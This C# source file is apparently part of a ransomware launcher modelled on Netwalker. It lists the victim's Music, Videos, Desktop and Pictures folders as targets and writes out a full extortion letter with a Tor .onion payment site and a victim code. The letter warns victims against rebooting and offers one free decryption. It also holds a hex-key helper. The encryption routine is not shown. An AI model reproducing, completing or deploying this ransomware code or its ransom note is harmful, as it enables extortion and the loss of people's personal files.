using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Launcher_Ransomware
{
    public class WinPaths
    {
        public string Music { get; } = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        public string Video { get; } = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
        public string Desktop { get; } = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public string Picture { get; } = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        public string Netwalker { get; set; }  
        public string Ransom_Letter { get; set; }
        public List<string> All_Paths { get; set; } = new List<string>();

        public WinPaths()
        {
            this.Netwalker = this.Desktop + "\\Netwalker_Ransomware.txt";

            this.All_Paths.Add(Music);
            this.All_Paths.Add(Video);
            this.All_Paths.Add(Desktop);
            this.All_Paths.Add(Picture);

            var str = new StringBuilder();
            str.Append("Hi!\n");
            str.Append("--\n");
            str.Append("If for some reason you read this text before the encryption ended,\n");
            str.Append("this can be understood by the fact that the computer slows down,\n");
            str.Append("and your heart rate has increased due to the ability to turn it off,\n");
            str.Append("then we recommend that you move away from the computer and accept that you have been compromised.\n");
            str.Append("Rebooting/shutdown will cause you to lose files without the possibility of recovery.\n\n");
            str.Append("--\n");
            str.Append("Our  encryption algorithms are very strong and your files are very well protected,\n");
            str.Append("the only way to get your files back is to cooperate with us and get the decrypter program.\n\n");
            str.Append("Do not try to recover your files without a decrypter program, you may damage them and then they will be impossible to recover.\n\n");
            str.Append("For us this is just business and to prove to you our seriousness, we will decrypt you one file for free.\n");
            str.Append("Just open our website, upload the encrypted file and get the decrypted file for free.");
            str.Append("--\n\n");
            str.Append("Steps to get access on our website:\n\n");
            str.Append("1.Download and install tor-browser: https://torproject.org/ \n\n");
            str.Append("2.Open our website: rnfdsgm6wb6j6su5txkekw4u4y47kp2eatvu7d6xhyn5cs4lt4pdrqqd.onion\n\n");
            str.Append("3.Put your personal code in the input form:\n\n");
            str.Append("{code_cb5649:\n");
            str.Append("2TZzViUpTZK4Ena/9vWLuWMfbDeotySIhArp052C1pOpN4JV7t\n");
            str.Append("9KIcnh7ld6ShqrKcoUXLe5AUhnGeueGVXotNamrYFuC3lz41Zj\n");
            str.Append("AtBl52xWNgLJ5UZkSrbjX8S+70RGDSF3zKmHsxJLOwF641tk6h\n");
            str.Append("38YmuOHg1GkSyJ1Yre4vYFlpDTz3ocW4Qlo36UM7O7pknkp4iI\n");
            str.Append("rA0Yy4D0Rf+MKW5zkvh6wJQbGA3AUyTdgyeznTLALOBK10Qx9a\n");
            str.Append("rnrMOX0+QeN/7tMg6ppt/SCxxofykiksBBraoNEQ==}");
            this.Ransom_Letter = str.ToString();
        }

        public byte[] HexStringToByteArray(string value)
        {
            int length = value.Length;
            if (length % 2 != 0)
            {
                throw new Exception("The binary key cannot have an odd number of digits");
            }

            byte[] data = new byte[length / 2];
            for (int i = 0; i < length; i += 2)
            {
                data[i / 2] = (byte)Convert.ToByte(value.Substring(i, 2), 16);
            }
            return data;
        }
    }
}
